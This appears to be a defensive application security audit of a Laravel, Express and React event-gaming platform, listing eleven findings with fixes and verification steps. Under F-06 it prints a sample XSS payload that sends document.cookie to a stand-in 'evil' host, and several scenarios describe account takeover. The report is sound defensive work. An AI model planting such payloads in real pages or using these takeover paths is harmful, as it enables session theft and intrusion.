Application Security Audit Report

Defensive security review of the Laravel admin panel, Node/TypeScript API, and React web frontend — with the highest-priority vulnerabilities remediated and verified.
Scope: Admin · API · Web Stack: Laravel 11 · Express/TS · React (TanStack) Date: 2026-08-31 15 findings

Executive Summary

The application is a multi-tier event-gaming platform: a Laravel admin panel + public API, a standalone Node/TypeScript API that drives organizer/participant flows and real-time gameplay over Socket.IO, and a React SPA. The recently added Razorpay payment layer is genuinely well engineered — server-side signature verification, amount re-derivation, idempotent settlement under row locks, raw-body webhook verification, and payload redaction — and needed no security changes.

However, the audit found a critical authentication bypass: the login/registration OTP was hardcoded to 123456 across four flows, allowing takeover of any organizer or participant account by email alone. This was compounded by a total absence of brute-force protection on the OTP endpoints and weak (non-cryptographic) OTP generation on the Laravel side. All three of these — plus a hardcoded JWT fallback secret — have been fixed and verified in this pass.

Remaining risks that require product/deployment decisions (stored-XSS sanitization of admin-authored HTML, Socket.IO connection authentication, secret rotation for the previously-exposed settings table, and production hardening of APP_DEBUG) are documented with remediation guidance but not auto-applied, as they need coordinated changes and testing.

Overall status (post-fix)

Moderate — the critical account-takeover path is closed; medium-severity defense-in-depth work remains.

Most important residual risk

Rotate any Razorpay/Stripe/SMTP secrets previously stored in the public settings table — deletion does not undo exposure.

Detailed Findings

F-01 Hardcoded OTP (123456) — full authentication bypass / account takeover Critical Fixed
Risk
Any anonymous user can log in as, or verify, any organizer or participant account knowing only an email address. Complete account takeover, including access to bookings, billing data, invoices and game control.
Affected files
apis/src/controllers/organizerController.ts (registerOrganizer, organizerLogin, resendOtp) apis/src/controllers/participantController.ts (participantJoin)
Component / route
POST /v1/organizer/register, /login, /verify-login, /verify-otp, /resend-otp; POST /v1/participant/join, /verify-otp
Why vulnerable
The real OTP generator was commented out and replaced with a constant during development:
//const otp = Math.floor(100000 + Math.random() * 900000).toString();
const otp = '123456';
The verify handlers compare the submitted OTP against this stored constant, so the "secret" second factor is publicly known.
Attack scenario
Attacker calls /login with a victim's email, then /verify-login with otp=123456 and receives a valid 24-hour JWT for that organizer. Same path takes over participant sessions.
Recommended fix
Generate the OTP with a CSPRNG on every request.
Fix applied
Yes. Added apis/src/utils/otp.ts → generateNumericOtp() using crypto.randomInt (zero-padded, full range), and replaced all four hardcoded assignments with generateNumericOtp(6).
Verification
  • grep -rn "123456" apis/src app → no OTP assignments remain (only unrelated numeric literals).
  • npm run build then grep "= '123456'" dist/ → none.
  • npm run test:security → asserts random 6-digit output, high uniqueness, no constant regression. Passes.
F-02 No brute-force / rate limiting on OTP authentication endpoints High Fixed
Risk
Even with a random 6-digit OTP, the 1,000,000-value space and 10-minute validity window are enumerable without a request cap — brute-force account takeover, plus email-flood abuse via unlimited send/resend.
Affected files
apis/src/routes/organizerRoutes.ts apis/src/routes/participantRoutes.ts
Component / route
All organizer & participant OTP send/verify routes (Node API)
Why vulnerable
Only join-link lookups were rate limited. The Node auth endpoints had no throttling middleware (unlike the Laravel API, which uses throttle:6,1).
Attack scenario
A script submits OTP guesses to /verify-login as fast as the network allows; within the validity window a single IP can cover a large fraction of the keyspace.
Recommended fix
Add per-client rate limiting to send and verify endpoints; back it with a per-account attempt counter that invalidates the OTP after N failures.
Fix applied
Yes (rate limiting). Added apis/src/middlewares/authRateLimit.ts: otpVerifyRateLimit (10 / 15 min) on verify routes and otpRequestRateLimit (15 / 15 min) on send/resend/register/login/join. Follow-up per-account attempt counter recommended for distributed attackers.
Verification
  • grep -c "otp*RateLimit" dist/routes/*.js → limiters present on compiled routes.
  • tsc --noEmit clean; build succeeds.
F-03 Gateway/SMTP credentials previously served by a public settings endpoint High Endpoint fixed · rotation pending
Risk
Sensitive secrets (Razorpay/Stripe key secrets, SMTP password) stored in the settings table were returned by an unauthenticated endpoint — full disclosure to anyone who could reach it.
Affected files
apis/src/controllers/publicController.ts (getSettings) database/migrations/2026_08_19_000003_move_payment_credentials_out_of_settings.php
Component / route
GET /v1/public/settings
Why vulnerable
The handler ran SELECT key, value FROM settings with no filter, so every admin-saved secret was public.
Attack scenario
A single unauthenticated request returns live payment/SMTP credentials, enabling fraudulent charges and mail relay abuse.
Recommended fix
Allowlist the public keys; move credentials to .env; and rotate every secret that was ever stored — deleting the rows does not undo the exposure.
Fix applied
Partially (prior work). The endpoint is now allowlisted (PUBLIC_SETTING_KEYS) and credentials moved to .env via migration. Manual action still required: rotate the exposed Razorpay/Stripe keys and smtp_password in their dashboards.
Verification
  • Confirm getSettings returns only the allowlisted keys (no *_secret, *_password).
  • Operational: verify new keys are set in .env and old ones revoked in the Razorpay/Stripe consoles.
F-04 Weak (non-cryptographic) OTP generation in the Laravel API Medium Fixed
Risk
rand() is not cryptographically secure; its output is predictable from prior values, weakening the OTP even where rate limiting exists.
Affected files
app/Http/Controllers/API/AuthController.php (sendOtp, resendOtp) app/Http/Controllers/API/GameJoinController.php (joinGame)
Component / route
POST /api/v1/auth/login/*, POST /api/v1/game-join/join
Why vulnerable
$otp = str_pad(rand(0, 999999), 6, '0', STR_PAD_LEFT);
rand() uses a predictable PRNG, not a CSPRNG.
Attack scenario
An attacker who can observe or influence RNG state narrows the OTP candidate set well below 10⁶, making guessing practical.
Recommended fix
Use random_int() (CSPRNG, identical output range and format).
Fix applied
Yes. All three rand(0, 999999) calls replaced with random_int(0, 999999).
Verification
  • php -l on both controllers → no syntax errors.
  • PHPUnit suite still green (13/13 payment-module tests pass).
F-05 Hardcoded JWT fallback secret (and inconsistent sign/verify keys) Medium Fixed
Risk
If JWT_SECRET is ever unset, tokens are signed/verified with a secret that is public in the source tree, allowing anyone to forge valid organizer tokens.
Affected files
apis/src/middlewares/authMiddleware.ts apis/src/controllers/resultsController.ts apis/src/controllers/organizerController.ts
Component / route
JWT signing at login and verification in authMiddleware / optionalAuthMiddleware / results access
Why vulnerable
Verification used process.env.JWT_SECRET || 'secret' while signing used || 'your_jwt_secret_key' — a public fallback, and the two disagreed (so the app already depends on the env var being set).
Attack scenario
In any deploy where the env var fails to load, an attacker signs {id, role:'organizer'} with the known fallback and is authenticated as any user.
Recommended fix
Require the secret from the environment; fail loudly if absent rather than falling back.
Fix applied
Yes. Added apis/src/utils/jwtSecret.ts → getJwtSecret() which throws if JWT_SECRET is missing; all four sign/verify sites now use it. Non-breaking (the env var is already set, and was already required due to the mismatch).
Verification
  • grep -rn "JWT_SECRET ||" apis/src → none remain (only doc comment).
  • tsc --noEmit clean; build succeeds; login flow unchanged with the env var set.
F-06 Stored XSS via unsanitized HTML rendering (admin-authored content) Medium Open — recommend fix
Risk
Rich-text fields are rendered as raw HTML in both the React SPA and Blade admin views. A malicious or compromised sub-admin can plant script that executes in a super-admin's or end-user's browser (privilege escalation / session theft).
Affected files
frontend/src/routes/game.tsx, index.tsx, join.$linkToken.tsx, cookandcreate/* (dangerouslySetInnerHTML) resources/views/admin/blogs/show.blade.php, cms/preview.blade.php, email-templates/show.blade.php, activity-games/show.blade.php ({!! ... !!})
Component
Game case_summary_html, activity description, CMS/blog/email-template bodies
Why vulnerable
dangerouslySetInnerHTML and Blade {!! !!} bypass output encoding; the content is not passed through an HTML sanitizer.
Attack scenario
A sub-admin with blog/CMS rights saves <img src=x onerror=fetch('//evil/'+document.cookie)>; it fires when a higher-privileged admin previews the page or a visitor loads the public content.
Recommended fix
Sanitize on render with DOMPurify (frontend) and an HTML purifier (e.g. mews/purifier) on save/render in Laravel; restrict the allowed tag/attribute set to formatting only.
Fix applied
No. Deferred — requires adding a sanitization dependency and reviewing each sink to avoid breaking legitimate rich-text rendering. Tracked for follow-up.
Verification
After remediation: attempt to save a payload with <script>/onerror and confirm it is stripped on output in both the SPA and admin views.
F-07 Unauthenticated Socket.IO connections and room subscriptions (IDOR) Medium Open — recommend fix
Risk
The real-time channel performs no handshake authentication. A client that supplies a (sequential, guessable) bookingId or groupId can subscribe to another organizer's dashboard or a game group and receive its live events.
Affected files
apis/src/socket/socketHandler.ts
Component
Events join_organizer_dashboard, join_lobby, request_presence, join_cc_instance
Why vulnerable
No io.use() auth middleware; handlers join rooms directly from client-supplied identifiers without verifying ownership.
Attack scenario
Attacker connects and emits join_organizer_dashboard {bookingId: N} for incrementing N, harvesting live event stats and presence for arbitrary bookings.
Recommended fix
Add a Socket.IO handshake auth middleware: verify the organizer JWT for dashboard rooms, and a participant session/join token for game rooms; authorize each room join against the authenticated identity.
Fix applied
No. Deferred — requires a coordinated backend + frontend change (the SPA must send credentials on connect) and live-gameplay regression testing.
Verification
After remediation: a connection without valid credentials is rejected; joining a room for a booking/group the identity does not own is refused.
F-08 Debug mode enabled in application configuration Medium Open — deployment
Risk
With APP_DEBUG=true, Laravel renders full stack traces, environment values and query details on errors — significant information disclosure if it reaches production.
Affected files
.env (APP_DEBUG=true, APP_ENV=local)
Why vulnerable
The local .env ships with debug on. It is git-ignored (good), but the production environment must be verified.
Attack scenario
If deployed with debug on, an error page leaks DB credentials, file paths and framework internals to any visitor.
Recommended fix
Ensure production sets APP_ENV=production and APP_DEBUG=false; the Node API already hides stack traces when NODE_ENV=production.
Fix applied
No (config/deployment). The .env is not tracked and is developer-local; flagged for the deploy checklist.
Verification
On the production host: php artisan tinker --execute="echo config('app.debug');" → false; confirm error pages show the generic message.
F-09 Sensitive join token passed in a URL query string Low Open
Risk
The participant join token — a bearer credential for the game — is embedded in a redirect URL, so it can leak via browser history, server access logs and the Referer header to third parties.
Affected files
app/Http/Controllers/API/GameJoinController.php:168
Why vulnerable
'redirect_url' => '/game/'.$participant->game_id.'?token='.$participant->join_token
Attack scenario
The token appears in logs/analytics/Referer; anyone who reads them can replay it to hijack the participant's game session.
Recommended fix
Deliver the token out of the URL (e.g. one-time exchange for a short-lived session cookie, or POST body), and keep tokens short-lived + single-use.
Fix applied
No. Deferred — changing the transport touches the participant redirect flow and the SPA; needs product review.
Verification
After remediation: confirm no token value appears in the redirect URL or access logs.
F-10 JWT / refresh tokens stored in localStorage Low Open
Risk
Tokens in localStorage are readable by any JavaScript on the origin, so any XSS (see F-06) escalates directly to token theft and account takeover.
Affected files
frontend/src/api/client.ts, middleware/auth.ts, lib/auth.ts
Why vulnerable
SPA stores the auth/refresh token in localStorage rather than an HttpOnly cookie.
Attack scenario
An injected script reads localStorage.getItem('auth_token') and exfiltrates it.
Recommended fix
Prefer HttpOnly; Secure; SameSite cookies for tokens; if localStorage is retained, treat F-06 sanitization as mandatory and keep token TTLs short.
Fix applied
No. Architectural change to the auth transport; documented as a hardening item.
Verification
After remediation: tokens are not present in localStorage/sessionStorage; auth cookie carries HttpOnly + Secure.
F-11 CORS allows any localhost origin regardless of environment Low Open
Risk
The Node API reflects any http://localhost:* / 127.0.0.1:* origin with credentials:true, even in production, slightly widening the CSRF/cross-origin surface for a victim running local software.
Affected files
apis/src/server.ts (isLocalDevelopmentOrigin / corsOptions)
Why vulnerable
The localhost allowance is unconditional rather than gated behind NODE_ENV !== 'production'.
Recommended fix
Restrict the localhost exception to non-production; in production rely solely on the explicit CORS_ORIGINS allowlist.
Fix applied
No. Low impact; grouped with production hardening.
Verification
In production, a request with Origin: http://localhost:3000 is not granted CORS.

Recommended Additional Security Improvements

Beyond the specific findings — relevant to this stack (Laravel + Express/TS + React + MySQL + Socket.IO + Razorpay).

Per-account OTP attempt counter

Complement IP rate limiting (F-02) with an otp_attempts column that invalidates the OTP after ~5 failures — defeats distributed brute force.

Socket.IO handshake auth

Add io.use() token verification and per-room ownership checks (F-07) so real-time channels match the REST authorization model.

HTML sanitization pipeline

Centralize DOMPurify (frontend) + an allowlist purifier (Laravel) for all rich-text sinks; sanitize on save and on render.

Security headers & CSP

Add a Content-Security-Policy to the SPA host that allows checkout.razorpay.com but blocks inline/unknown scripts; keep X-Frame-Options/frame-ancestors for clickjacking.

Secure cookie strategy

Move auth tokens to HttpOnly; Secure; SameSite=Lax cookies (F-10); enforce HTTPS/HSTS at the edge.

Dependency & secret scanning

Add npm audit / composer audit and a secret scanner (gitleaks) to CI; the F-03 exposure would have been caught pre-merge.

Audit logging

Record admin financial actions (COD settle, refunds) and auth events with actor + timestamp; some already log — make it consistent and tamper-evident.

Automated security tests in CI

Run the new npm run test:security and PHPUnit access-control tests on every PR; add IDOR/authorization cases.

Least-privilege DB user

Grant the app DB account only DML on its schema (no DDL/GRANT); the runtime schema-migration helpers should run under a separate migration credential.

Production hardening checklist

APP_DEBUG=false, NODE_ENV=production, strict CORS, live Razorpay keys via .env, rotate exposed secrets, disable stack traces.
